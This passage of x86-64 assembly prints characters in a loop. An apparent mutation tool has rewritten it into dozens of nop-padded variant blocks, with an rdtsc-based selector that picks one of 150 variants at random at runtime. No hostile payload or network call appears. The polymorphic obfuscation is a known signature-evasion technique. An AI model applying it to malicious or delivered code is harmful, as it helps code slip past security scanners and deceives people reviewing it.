	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 100
.Lmain_win2_var100:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
	nop
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
	nop
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 101
.Lmain_win2_var101:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	nop
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 102
.Lmain_win2_var102:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 103
.Lmain_win2_var103:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	nop
	nop
	nop
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 104
.Lmain_win2_var104:
	popq	%rax
	cmpl	$31, %eax
	nop
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
	nop
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 105
.Lmain_win2_var105:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	nop
	jmp	.Lmain_win2_continue
## Variant 106
.Lmain_win2_var106:
	popq	%rax
	cmpl	$31, %eax
	nop
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	nop
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 107
.Lmain_win2_var107:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	nop
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	nop
	jmp	.Lmain_win2_continue
## Variant 108
.Lmain_win2_var108:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	nop
	jmp	.Lmain_win2_continue
## Variant 109
.Lmain_win2_var109:
	popq	%rax
	nop
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	nop
	jge	LBB2_13
	nop
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 110
.Lmain_win2_var110:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	nop
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 111
.Lmain_win2_var111:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	nop
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	nop
	nop
	jmp	.Lmain_win2_continue
## Variant 112
.Lmain_win2_var112:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	nop
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	nop
	jmp	.Lmain_win2_continue
## Variant 113
.Lmain_win2_var113:
	popq	%rax
	nop
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
	nop
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 114
.Lmain_win2_var114:
	popq	%rax
	cmpl	$31, %eax
	nop
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-54(%rbp), %eax
	nop
	jmp	.Lmain_win2_continue
## Variant 115
.Lmain_win2_var115:
	popq	%rax
	nop
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	nop
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 116
.Lmain_win2_var116:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 117
.Lmain_win2_var117:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	nop
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 118
.Lmain_win2_var118:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	nop
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	nop
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 119
.Lmain_win2_var119:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
	nop
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 120
.Lmain_win2_var120:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
	nop
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
	nop
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 121
.Lmain_win2_var121:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	nop
	jmp	.Lmain_win2_continue
## Variant 122
.Lmain_win2_var122:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	nop
	jge	LBB2_13
	nop
	nop
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 123
.Lmain_win2_var123:
	popq	%rax
	nop
	nop
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	nop
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 124
.Lmain_win2_var124:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	nop
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	nop
	nop
	jmp	.Lmain_win2_continue
## Variant 125
.Lmain_win2_var125:
	popq	%rax
	cmpl	$31, %eax
	nop
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	nop
	jmp	.Lmain_win2_continue
## Variant 126
.Lmain_win2_var126:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	nop
	jmp	.Lmain_win2_continue
## Variant 127
.Lmain_win2_var127:
	popq	%rax
	nop
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 128
.Lmain_win2_var128:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
	nop
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 129
.Lmain_win2_var129:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	nop
	nop
	jmp	.Lmain_win2_continue
## Variant 130
.Lmain_win2_var130:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	nop
	jmp	.Lmain_win2_continue
## Variant 131
.Lmain_win2_var131:
	popq	%rax
	cmpl	$31, %eax
	nop
	nop
	nop
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 132
.Lmain_win2_var132:
	popq	%rax
	nop
	nop
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 133
.Lmain_win2_var133:
	popq	%rax
	cmpl	$31, %eax
	nop
	jle	LBB2_13
	nop
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 134
.Lmain_win2_var134:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	nop
	jmp	.Lmain_win2_continue
## Variant 135
.Lmain_win2_var135:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	nop
	cmpl	$127, %eax
	nop
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 136
.Lmain_win2_var136:
	popq	%rax
	nop
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 137
.Lmain_win2_var137:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
	nop
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	nop
	nop
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 138
.Lmain_win2_var138:
	popq	%rax
	nop
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	nop
	cmpl	$127, %eax
	jge	LBB2_13
	nop
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 139
.Lmain_win2_var139:
	popq	%rax
	nop
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	nop
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 140
.Lmain_win2_var140:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	nop
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 141
.Lmain_win2_var141:
	popq	%rax
	cmpl	$31, %eax
	nop
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 142
.Lmain_win2_var142:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	nop
	jge	LBB2_13
	nop
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	nop
	jmp	.Lmain_win2_continue
## Variant 143
.Lmain_win2_var143:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
	nop
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
	nop
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 144
.Lmain_win2_var144:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
	nop
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	nop
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 145
.Lmain_win2_var145:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-54(%rbp), %eax
	nop
	jmp	.Lmain_win2_continue
## Variant 146
.Lmain_win2_var146:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	nop
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 147
.Lmain_win2_var147:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	nop
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 148
.Lmain_win2_var148:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
	nop
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	nop
	nop
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 149
.Lmain_win2_var149:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
	nop
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	nop
	nop
	jmp	.Lmain_win2_continue
.Lmain_win2_continue:
	movl	%eax, -68(%rbp)    # # 4-byte Spill
	jmp	LBB2_14
LBB2_13:                                ##   in Loop: Header=BB2_9 Depth=1
	movl	$63, %eax
	movl	%eax, -68(%rbp)    # # 4-byte Spill
	jmp	LBB2_14
LBB2_14:                                ##   in Loop: Header=BB2_9 Depth=1
	movl	-64(%rbp), %esi    # # 4-byte Reload
	movl	-68(%rbp), %edx    # # 4-byte Reload
	movl	-16(%rbp), %ecx
	leaq	L_.str.16(%rip), %rdi
	movb	$0, %al
	callq	_printf
## Start of variant dynamic selector
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$150, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.Lmain_win1_var0
	cmpl	$1, %eax
	je	.Lmain_win1_var1
	cmpl	$2, %eax
	je	.Lmain_win1_var2
	cmpl	$3, %eax
	je	.Lmain_win1_var3
	cmpl	$4, %eax
	je	.Lmain_win1_var4
	cmpl	$5, %eax
	je	.Lmain_win1_var5
	cmpl	$6, %eax
	je	.Lmain_win1_var6
	cmpl	$7, %eax
	je	.Lmain_win1_var7
	cmpl	$8, %eax
	je	.Lmain_win1_var8
	cmpl	$9, %eax
	je	.Lmain_win1_var9
	cmpl	$10, %eax
	je	.Lmain_win1_var10
	cmpl	$11, %eax
	je	.Lmain_win1_var11
	cmpl	$12, %eax
	je	.Lmain_win1_var12
	cmpl	$13, %eax
	je	.Lmain_win1_var13
	cmpl	$14, %eax
	je	.Lmain_win1_var14
	cmpl	$15, %eax
	je	.Lmain_win1_var15
	cmpl	$16, %eax
	je	.Lmain_win1_var16
	cmpl	$17, %eax
	je	.Lmain_win1_var17
	cmpl	$18, %eax
	je	.Lmain_win1_var18
	cmpl	$19, %eax
	je	.Lmain_win1_var19
	cmpl	$20, %eax
	je	.Lmain_win1_var20
	cmpl	$21, %eax
	je	.Lmain_win1_var21
	cmpl	$22, %eax
	je	.Lmain_win1_var22
	cmpl	$23, %eax
	je	.Lmain_win1_var23
	cmpl	$24, %eax
	je	.Lmain_win1_var24
	cmpl	$25, %eax
	je	.Lmain_win1_var25
	cmpl	$26, %eax
	je	.Lmain_win1_var26
	cmpl	$27, %eax
	je	.Lmain_win1_var27
	cmpl	$28, %eax
	je	.Lmain_win1_var28
	cmpl	$29, %eax
	je	.Lmain_win1_var29
	cmpl	$30, %eax
	je	.Lmain_win1_var30
	cmpl	$31, %eax
	je	.Lmain_win1_var31
	cmpl	$32, %eax
	je	.Lmain_win1_var32
	cmpl	$33, %eax
	je	.Lmain_win1_var33
	cmpl	$34, %eax
	je	.Lmain_win1_var34
	cmpl	$35, %eax
	je	.Lmain_win1_var35
	cmpl	$36, %eax
	je	.Lmain_win1_var36
	cmpl	$37, %eax
	je	.Lmain_win1_var37
	cmpl	$38, %eax
	je	.Lmain_win1_var38
	cmpl	$39, %eax
	je	.Lmain_win1_var39
	cmpl	$40, %eax
	je	.Lmain_win1_var40
	cmpl	$41, %eax
	je	.Lmain_win1_var41
	cmpl	$42, %eax
	je	.Lmain_win1_var42
	cmpl	$43, %eax
	je	.Lmain_win1_var43
	cmpl	$44, %eax
	je	.Lmain_win1_var44
	cmpl	$45, %eax
	je	.Lmain_win1_var45
	cmpl	$46, %eax
	je	.Lmain_win1_var46
	cmpl	$47, %eax
	je	.Lmain_win1_var47
	cmpl	$48, %eax
	je	.Lmain_win1_var48
	cmpl	$49, %eax
	je	.Lmain_win1_var49
	cmpl	$50, %eax
	je	.Lmain_win1_var50
	cmpl	$51, %eax
	je	.Lmain_win1_var51
	cmpl	$52, %eax
	je	.Lmain_win1_var52
	cmpl	$53, %eax
	je	.Lmain_win1_var53
	cmpl	$54, %eax
	je	.Lmain_win1_var54
	cmpl	$55, %eax
	je	.Lmain_win1_var55
	cmpl	$56, %eax
	je	.Lmain_win1_var56
	cmpl	$57, %eax
	je	.Lmain_win1_var57
	cmpl	$58, %eax
	je	.Lmain_win1_var58
	cmpl	$59, %eax
	je	.Lmain_win1_var59
	cmpl	$60, %eax
	je	.Lmain_win1_var60
	cmpl	$61, %eax
	je	.Lmain_win1_var61
	cmpl	$62, %eax
	je	.Lmain_win1_var62
	cmpl	$63, %eax
	je	.Lmain_win1_var63
	cmpl	$64, %eax
	je	.Lmain_win1_var64
	cmpl	$65, %eax
	je	.Lmain_win1_var65
	cmpl	$66, %eax
	je	.Lmain_win1_var66
	cmpl	$67, %eax
	je	.Lmain_win1_var67
	cmpl	$68, %eax
	je	.Lmain_win1_var68
	cmpl	$69, %eax
	je	.Lmain_win1_var69
	cmpl	$70, %eax
	je	.Lmain_win1_var70
	cmpl	$71, %eax
	je	.Lmain_win1_var71
	cmpl	$72, %eax
	je	.Lmain_win1_var72
	cmpl	$73, %eax
	je	.Lmain_win1_var73
	cmpl	$74, %eax
	je	.Lmain_win1_var74
	cmpl	$75, %eax
	je	.Lmain_win1_var75
	cmpl	$76, %eax
	je	.Lmain_win1_var76
	cmpl	$77, %eax
	je	.Lmain_win1_var77
	cmpl	$78, %eax
	je	.Lmain_win1_var78
	cmpl	$79, %eax
	je	.Lmain_win1_var79
	cmpl	$80, %eax
	je	.Lmain_win1_var80
	cmpl	$81, %eax
	je	.Lmain_win1_var81
	cmpl	$82, %eax
	je	.Lmain_win1_var82
	cmpl	$83, %eax
	je	.Lmain_win1_var83
	cmpl	$84, %eax
	je	.Lmain_win1_var84
	cmpl	$85, %eax
	je	.Lmain_win1_var85
	cmpl	$86, %eax
	je	.Lmain_win1_var86
	cmpl	$87, %eax
	je	.Lmain_win1_var87
	cmpl	$88, %eax
	je	.Lmain_win1_var88
	cmpl	$89, %eax
	je	.Lmain_win1_var89
	cmpl	$90, %eax
	je	.Lmain_win1_var90
	cmpl	$91, %eax
	je	.Lmain_win1_var91
	cmpl	$92, %eax
	je	.Lmain_win1_var92
	cmpl	$93, %eax
	je	.Lmain_win1_var93
	cmpl	$94, %eax
	je	.Lmain_win1_var94
	cmpl	$95, %eax
	je	.Lmain_win1_var95
	cmpl	$96, %eax
	je	.Lmain_win1_var96
	cmpl	$97, %eax
	je	.Lmain_win1_var97
	cmpl	$98, %eax
	je	.Lmain_win1_var98
	cmpl	$99, %eax
	je	.Lmain_win1_var99
	cmpl	$100, %eax
	je	.Lmain_win1_var100
	cmpl	$101, %eax
	je	.Lmain_win1_var101
	cmpl	$102, %eax
	je	.Lmain_win1_var102
	cmpl	$103, %eax
	je	.Lmain_win1_var103
	cmpl	$104, %eax
	je	.Lmain_win1_var104
	cmpl	$105, %eax
	je	.Lmain_win1_var105
	cmpl	$106, %eax
	je	.Lmain_win1_var106
	cmpl	$107, %eax
	je	.Lmain_win1_var107
	cmpl	$108, %eax
	je	.Lmain_win1_var108
	cmpl	$109, %eax
	je	.Lmain_win1_var109
	cmpl	$110, %eax
	je	.Lmain_win1_var110
	cmpl	$111, %eax
	je	.Lmain_win1_var111
	cmpl	$112, %eax
	je	.Lmain_win1_var112
	cmpl	$113, %eax
	je	.Lmain_win1_var113
	cmpl	$114, %eax
	je	.Lmain_win1_var114
	cmpl	$115, %eax
	je	.Lmain_win1_var115
	cmpl	$116, %eax
	je	.Lmain_win1_var116
	cmpl	$117, %eax
	je	.Lmain_win1_var117
	cmpl	$118, %eax
	je	.Lmain_win1_var118
	cmpl	$119, %eax
	je	.Lmain_win1_var119
	cmpl	$120, %eax
	je	.Lmain_win1_var120
	cmpl	$121, %eax
	je	.Lmain_win1_var121
	cmpl	$122, %eax
	je	.Lmain_win1_var122
	cmpl	$123, %eax
	je	.Lmain_win1_var123
	cmpl	$124, %eax
	je	.Lmain_win1_var124
	cmpl	$125, %eax
	je	.Lmain_win1_var125
	cmpl	$126, %eax
	je	.Lmain_win1_var126
	cmpl	$127, %eax
	je	.Lmain_win1_var127
	cmpl	$128, %eax
	je	.Lmain_win1_var128
	cmpl	$129, %eax
	je	.Lmain_win1_var129
	cmpl	$130, %eax
	je	.Lmain_win1_var130
	cmpl	$131, %eax
	je	.Lmain_win1_var131
	cmpl	$132, %eax
	je	.Lmain_win1_var132
	cmpl	$133, %eax
	je	.Lmain_win1_var133
	cmpl	$134, %eax
	je	.Lmain_win1_var134
	cmpl	$135, %eax
	je	.Lmain_win1_var135
	cmpl	$136, %eax
	je	.Lmain_win1_var136
	cmpl	$137, %eax
	je	.Lmain_win1_var137
	cmpl	$138, %eax
	je	.Lmain_win1_var138
	cmpl	$139, %eax
	je	.Lmain_win1_var139
	cmpl	$140, %eax
	je	.Lmain_win1_var140
	cmpl	$141, %eax
	je	.Lmain_win1_var141
	cmpl	$142, %eax
	je	.Lmain_win1_var142
	cmpl	$143, %eax
	je	.Lmain_win1_var143
	cmpl	$144, %eax
	je	.Lmain_win1_var144
	cmpl	$145, %eax
	je	.Lmain_win1_var145
	cmpl	$146, %eax
	je	.Lmain_win1_var146
	cmpl	$147, %eax
	je	.Lmain_win1_var147
	cmpl	$148, %eax
	je	.Lmain_win1_var148
	cmpl	$149, %eax
	je	.Lmain_win1_var149
	jmp	.Lmain_win1_var0
## Variant 0
.Lmain_win1_var0:
	popq	%rax
	cmpl	$0, -12(%rbp)
	jle	LBB2_20
## %bb.15:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	movl	%eax, -72(%rbp)    # # 4-byte Spill
